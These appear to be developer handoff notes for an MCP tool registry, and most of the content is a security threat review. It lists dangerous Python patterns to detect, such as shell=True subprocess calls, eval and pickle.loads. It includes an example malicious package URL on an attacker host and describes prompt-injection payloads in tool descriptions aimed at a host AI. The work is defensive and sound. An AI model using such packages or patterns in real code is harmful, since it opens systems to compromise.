# Phase 4 — In-flight observations for v0.4.x patches

## Registry-side AST scan for dangerous Python patterns (HIGH)

Claude (the host AI in our stress-testing session) raised a critical point we missed in Phase 3: the registry's contribute-time validation today checks Unicode sanitization on visible fields and runs the description through the quarantine LLM, but **does not inspect the Python AST for known-dangerous patterns**. That means a tool whose source contains `subprocess.run(command, shell=True)` with a parameterized argument can land in the registry, and the only thing between it and a click-through user is the runtime confirmation gate. That's not enough — confirmation prompts get clicked.

The fix is a server-side AST scan in `packages/registry/src/routes/contribute.ts`, run after manifest validation but before persistence. Reject contributions where the source contains:

- `subprocess.run(..., shell=True)` with a non-literal first argument
- `subprocess.Popen(..., shell=True)` similar
- `os.system(...)` with non-literal argument
- `eval(...)` or `exec(...)` on any expression that isn't a string literal
- `__import__(...)` with non-literal module name
- `pickle.loads(...)` on non-literal bytes
- Any direct write to `/proc/self/mem` or similar low-level system paths

A hatch for the rare tool that genuinely needs raw shell: `manifest.allow_dangerous: true` opt-in. Tools with this flag:
- Are NEVER auto-pullable from the registry by `patch_generate_tool`
- Show a prominent warning in any UI surface
- Default to `human_confirm: true` regardless of what the manifest declares

Implementation: Python AST is available via Node by spawning `python3 -c "ast.parse(...)"` and walking the JSON, or by using a JS-side parser like `lezer-python` for a faster check. The Worker can run subprocess via `node:child_process` since wrangler.toml has `nodejs_compat`.

Status: tracked. Add to v0.4.x.

## Better shape for shell-exec-style tools

The right pattern is **structured args, not a free-form command string**. Instead of `run_shell({ command: "git status" })`, encourage `run_git({ subcommand: "status" })` with an allowlist of binaries. Document this in the manifest format docs as a contributor convention. The AST scan above can also reject `run_shell`-shaped tools by name pattern — though this is more controversial; some users want raw shell.

## Demo / launch artifact correction

The injection demo I built (`scripts/demo-injection.mjs`) and the `confirmation_required` story in the launch post both implicitly relied on the host AI doing the wrong thing so that Patch's defense became visible. That framing is wrong by the threat model. The defense is supposed to fire at the runtime layer regardless of host behavior. The demo for the launch post must be a runtime test that drives `runtime.invokeTool` directly via an MCP client (we have one — `packages/mcp/src/security-integration.test.ts`), not a screenshot of Claude refusing.

Updated LAUNCH.md accordingly.

# Phase 3 — Implementation notes for Phase 4 (forensics + observability) handoff

## Performance and cost

- **Quarantine LLM latency** (Workers AI Llama 3.3 70B) is the dominant cost on the contribute path. Each `POST /v1/tools` invocation does one quarantine call (~1–3s typical) on top of the embedding call. Phase 4 should consider caching: the SHA-256 of the description input could key a Workers KV cache so re-contributions of the same description (common during the pre-seed flow) skip the LLM. TTL ~7 days is reasonable.
- **Sanitizer is sub-millisecond** for any reasonable input size. No optimization needed.
- **Taint tracker** is per-session in-memory; constant-time relative to ring-buffer size. No persistence cost.
- **Confirmation store** is per-session in-memory with 60s TTL. No persistence; if the user idles past 60s the token expires and they'd be re-prompted. Acceptable tradeoff.

## Sanitizer false positives observed

(empty — populate after real-user data lands)

The mixed-script flag is the only category we expect to be noisy in production. We deliberately flag-don't-strip there, so a false positive doesn't break the user; it just adds an entry to the response's `flags` array that callers can ignore. Watch for repeated complaints about specific multi-script combinations (e.g. Greek mathematical symbols mixed with Latin) and tighten the heuristic if needed.

## Arcade integration — open work

The v0.3 implementation is a stub. Phase 4 should:

1. Replace `createArcadeClient` with the real Arcade SDK (`@arcadeai/arcadejs` or its successor). Map `manifest.external_auth: ["gmail.read", ...]` to Arcade's tool/scope identifiers; the mapping likely lives in `packages/mcp/src/arcade-providers.ts` (new file).
2. Decide how to surface the auth_required state across MCP host UIs. Today we return a structured `external_auth_required` response with the URL; some hosts will surface it well, others won't. May need a fallback that writes to stderr like the auth_register flow does.
3. Token caching: Arcade tokens are short-lived. If a tool gets called repeatedly within the token's TTL we shouldn't re-mint. Cache by `(user_id, scopes)` keyed on a session.

## Patterns observed across rejected contributions

(empty — populate after real-user data lands)

What to instrument on the registry side as we deploy:

- Counts of `manifest_unsafe_unicode` rejections grouped by which field (name vs description vs input description) and which sanitizer category.
- Counts of `description_flagged_by_quarantine` rejections grouped by the flag(s) Llama returned.
- Counts of `name_taken` (409) responses — useful for spotting attempted typo-squatting.

These metrics should NOT include the rejected content itself. Only the categorical counts.

## Forensic audit trails — data-model gaps

Phase 4's audit trail story needs execution-level logs. The current data model has:

- `tool_runs` table: per-execution row with success bool, error_class, duration_ms. **No inputs/outputs persisted** (correct — they may be sensitive).
- R2 source blobs: content-addressed by SHA-256, immutable. Good — every version's exact source is traceable.

What's missing for Phase 4:

- **Per-execution sandbox stdout/stderr capture.** We don't currently store this. Options: (a) Phase 4 adds opt-in capture into the `tool_runs` table or to R2 keyed by run_id; (b) Phase 4 streams to Langfuse and queries via their UI.
- **Argument hashes (not values).** A SHA-256 of the JSON-serialized args would let us answer "did anyone call this tool with these args?" without storing PII. Add a `args_sha256` column to `tool_runs` if Phase 4 wants this capability.
- **Generation provenance.** When a tool is generated locally, we record `generated_by` and `generated_at` in the manifest. We do NOT record the prompt that produced it. If Phase 4 wants "show me the description that led to this code," we'd need to add a `tools.generation_prompt` column (after sanitizing the prompt itself).

## Per-IP rate limiting on registry

Documented as a gap in THREAT_MODEL.md. Phase 4 should add Cloudflare Workers' rate-limiting binding via the `unsafe.bindings` block in wrangler.toml:

```toml
[[unsafe.bindings]]
name = "RATE_LIMITER_QUARANTINE"
type = "ratelimit"
namespace_id = "...random-uuid..."
simple = { limit = 30, period = 60 }
```

Then in routes/quarantine.ts and routes/runs.ts: call `await env.RATE_LIMITER_QUARANTINE.limit({ key: c.req.header('cf-connecting-ip') ?? 'global' })` before the work. Returns `{ success: true | false }`.

This requires Workers Pro plan. Until then, edge DDoS protection is what we have.

## Test infrastructure observations

- Vitest workspace works well with our package layout. New packages should add a `vitest.config.ts` and the workspace will auto-include them.
- The `parseManifest` import in security-integration.test.ts now goes through `@patch-cat/shared` cleanly. We had to drop `require()` because shared's exports map only declares `import`+`types` conditions (intentional — this is an ESM-only project).
- The injection demo (`scripts/demo-injection.mjs`) is intentionally inlined — copy/paste-runnable in any Node 20+ environment without workspace setup. Don't refactor it to import from `@patch-cat/shared`; the dogfood-able demo IS the marketing artifact.

# Phase 2 — Implementation notes for Phase 3 (security) handoff

This section captures every place in the v0.2 codebase where untrusted data flows through
the system, where capability scopes are advertised but unenforced, or where a token /
listener could be intercepted. Phase 3's job is to close every item.

## Untrusted-content flow paths

1. **Tool source code is fetched from R2 by URL and executed in e2b.**
   - File: `packages/mcp/src/registry-client.ts:78` — `fetchTool` follows `meta.source_url` blindly.
   - The URL comes from the registry's `tools.source_url` JSON field, which is built from
     `PUBLIC_R2_HOST + sha256`. A compromised registry (or MITM) could swap the URL.
   - Phase 3 fix: verify the downloaded source's SHA-256 matches the `source_sha256` in the
     metadata before saving / running.

2. **Tool descriptions, names, and (latent) errors flow to the host AI's planner.**
   - File: `packages/mcp/src/server.ts:160` — `tools/list` returns user-contributed descriptions.
   - A malicious description can carry prompt-injection payloads. The host AI's planner sees
     them in raw form.
   - Phase 3 fix: route every user-contributed string through the quarantine LLM before it
     reaches a context that can call tools. This is the "dual-LLM split" promised in
     `CLAUDE.md`.

3. **Tool argument inputs marked `tainted_ok: true` are not actually tracked.**
   - File: `packages/shared/src/manifest.ts` — `tainted_ok` is preserved as `x-tainted-ok` on
     the JSON Schema but no consumer reads it.
   - The MCP server passes args straight to `sandbox.runTool` regardless of taint.
   - Phase 3 fix: track taint on every value flowing through the planner; refuse to feed
     tainted values into untainted slots.

## Manifest fields with weak validation

4. **`runtime.packages` accepts arbitrary strings.**
   - File: `packages/shared/src/manifest.ts:44` — `z.array(z.string())`.
   - We rely on convention ("`name==version`") but don't enforce it. A package like
     `git+https://attacker.com/evil.git` would be accepted by zod and passed to `pip install`
     in the sandbox.
   - Phase 3 fix: regex-validate each package as `^[a-zA-Z0-9._-]+==\d+(\.\d+){0,2}$`; reject
     anything else.

5. **`capabilities` is advertised but not enforced.**
   - File: `packages/mcp/src/sandbox.ts` — `runTool` ignores `manifest.capabilities`.
   - A tool can declare `network: false` and still call out to the internet. The sandbox
     doesn't restrict.
   - Phase 3 fix: configure e2b's sandbox network policy from the manifest at create-time.

6. **`description` and `name` are user-controlled and stored as plain text.**
   - These are returned in JSON responses (no HTML escaping needed there) but the registry's
     `oauth/github/callback` route returns `handle: contributor.githubHandle` — also plain
     JSON, so XSS isn't a path. But if a future endpoint ever HTML-renders descriptions, it
     must escape. Open `packages/registry/src/routes/contribute.ts` to remember.

## Long-running connections / token interception

7. **`patch_auth_register` localhost listener accepts any token sent to `/callback`.**
   - File: `packages/mcp/src/auth-flow.ts:60-80`.
   - If a malicious local process polls and posts a fake token to the listener before the
     real OAuth callback fires, Patch saves the attacker's token.
   - Phase 3 fix: the MCP tool generates a state nonce, includes it in the URL it sends to
     the registry's `/auth/github/start?redirect=...`, registry preserves it through the
     callback, listener verifies the returned token's payload matches the nonce.

8. **Run telemetry endpoint is anonymous and unauthenticated.**
   - File: `packages/registry/src/routes/runs.ts`.
   - Anyone can POST to `/v1/tools/:name/runs` to inflate `use_count` / `success_count`.
     Worst case: an attacker boosts a typosquat tool above the legitimate version, getting it
     pulled into other users' toolboxes via search-first behavior.
   - Phase 3 fix: rate-limit by IP via Cloudflare's rate-limiting binding, sign requests with
     a per-machine ephemeral key, or require attestation. At minimum: aggressive rate limit.

9. **Contribute endpoint accepts manifests without dry-running the source.**
   - File: `packages/registry/src/routes/contribute.ts`.
   - We re-parse the frontmatter and check name/version match, but don't compile or sandbox-
     run the source. A contributor could push code that deliberately blows up `pip install`
     or imports something malicious.
   - Phase 3 fix: server-side `py_compile` (cheap) + optional sandbox dry-run.

10. **`oauth_state` cookie is set with `path=/auth`** — fine — but the **`oauth_downstream`
    cookie also at `path=/auth`** persists across the redirect window. If the user starts
    OAuth twice in quick succession, the second flow's downstream may overwrite the first's,
    so the wrong listener gets the token. Acceptable risk for v0.2 (rare); v0.3 could namespace
    cookies by state nonce.

## Secrets / configuration

11. **Pre-seed script reads `PATCH_CONTRIBUTE_TOKEN` from `.env`.**
    - File: `scripts/preseed.mjs`.
    - The token has full contribute privileges for the official `patch-cat` account. If the
      `.env` leaks (shell history, accidental commit, backup) the registry can be polluted.
    - Phase 3 mitigation: rotate token regularly, prefer short-lived tokens scoped to one
      pre-seed run.

12. **`SESSION_SECRET` is loaded from Worker secrets, but no rotation policy exists.**
    - All session JWTs are signed with the same secret. Rotating it invalidates every active
      session.
    - Phase 3 fix: support overlapping `SESSION_SECRET` / `SESSION_SECRET_PREVIOUS` so we can
      rotate without forcing all users to re-auth.

## Squatting / abuse vectors

13. **Tool names are first-come-first-served, globally.**
    - The registry's contribute endpoint returns 409 for name collisions across contributors,
      which prevents takeover. But it doesn't prevent malicious early registration of
      "obvious" names like `fetch_url`, `parse_csv`, etc.
    - Phase 3 fix: pre-seed all "obvious" common names under the official `patch-cat` account
      *before* opening contribution to the public. Manual review of newly-contributed tool
      names against a typosquat / lookalike heuristic.

## CORS / cross-origin

14. **`/v1/*` is `cors origin: "*"`** — correct for a public read API, but `POST /v1/tools`
    sits behind it too. Bearer-token auth mitigates CSRF (cookies aren't sent cross-origin
    on `*` origins by default), but worth re-reviewing in Phase 3.

---

# Phase 1 — Implementation notes for Phase 2 handoff

## Decisions that may want revisiting in Phase 2

- **Tool name collision is treated as a hard error** in both `generator.ts` (when the LLM picks a colliding name) and `toolbox.saveTool` (defense-in-depth). v0.2 will need an upsert path when the registry returns an updated version of an existing tool. Plan: extend `Toolbox` with `replaceTool(manifest, body)` that bumps the version and overwrites the file.
- **`saveTool` writes the .py file before updating `index.json`.** If the process is killed in between, you can end up with an orphan .py with no index entry. Fine for v0.1 (just rerun). Phase 2 should write to a temp file and atomically rename, then update the index.
- **No embedding generated yet.** `ToolEntry.embedding` is always `null` in v0.1. Phase 2 will populate this against Workers AI's `bge-base-en-v1.5` (768-dim) when a tool is saved or pulled from the registry.
- **No registry client.** Intentionally not scaffolded as an interface — Phase 2 will introduce `RegistryClient` and inject it into the server's `handleGenerate` so the lookup-before-generate path is one place to add.
- **Smoke test is `py_compile` only.** It catches syntax errors but doesn't catch import errors, missing packages, or runtime issues. We considered running with empty/default args but skipped it for v0.1 to keep latency under ~3 seconds.

## Things deliberately deferred

| Item | Phase | Why deferred |
|------|-------|--------------|
| Capability scope enforcement (network/filesystem) in e2b config | 3 | The schema captures intent; enforcement is a sandbox-config concern, not a generator concern. |
| Quarantine LLM for untrusted text | 3 | Requires Workers AI + Cloudflare AI Gateway, both Phase 2 infrastructure. |
| Forensic audit logs in `runs/` | 4 | Directory is created and reserved; Phase 4 will write per-execution content-addressed records here. |
| Streaming tool output over MCP | post-v1 | The MCP spec supports it but our v0.1 tools are short-lived. Revisit when someone generates a long-running tool. |
| Arcade-mediated OAuth for external APIs | 3 | First we need the registry; tools that call OAuth APIs are a small slice of generated tools today. |

## Known rough edges

1. **Cold-start latency for `patch_generate_tool` is dominated by `pip install` in the smoke-test sandbox.** Currently we sidestep this by only running `py_compile` (no package install) for the smoke test. The real install happens on first invocation and is usually cached by e2b for the lifetime of the sandbox — but a brand-new sandbox per call is wasteful. Phase 2 candidate: long-lived sandboxes pinned per-tool.
2. **`Server.sendToolListChanged` is fire-and-forget on the server side.** If the host hasn't subscribed (it always does, but theoretically), the host won't see new tools until it next calls `tools/list`. Acceptable for v0.1.
3. **Logger uses `pino.destination({ fd: 2, sync: false })`.** Async writes mean a hard crash can drop the last few log lines. If we ever debug a startup-time crash, switch to `sync: true` temporarily.
4. **No retry / backoff in the generator or sandbox.** A transient Anthropic rate-limit or e2b cold-start failure surfaces as an MCP tool error. Acceptable for v0.1 — the host AI typically retries on its own.

## File layout, for next-session orientation

```
src/
├── errors.ts        Typed errors used at module boundaries.
├── manifest.ts      Zod schema, parse/serialize, JSON Schema converter.
├── toolbox.ts       Filesystem-backed tool index + CRUD.
├── generator.ts     Anthropic-backed tool generator with few-shot system prompt.
├── sandbox.ts       e2b-backed runner + py_compile syntax check.
├── server.ts        MCP server with three meta-tools + dynamic per-tool registration.
├── logger.ts        pino-to-stderr.
└── index.ts         Bin entry: stdio transport + dependency wiring.
```

## Things to wire on day 1 of Phase 2

- `RegistryClient` interface in `src/registry.ts`. Inject into `handleGenerate` ahead of `generator.generate(...)`. Default implementation (still local-only) returns `null` so generation always proceeds.
- Embedding helper that takes a manifest and produces a 768-dim vector. For local-only it's a no-op stub.
- `ToolEntry.contentHash` field (SHA-256 of the .py file body). Add to the index now if you want migration to be free; otherwise plan a one-shot migration on first launch.
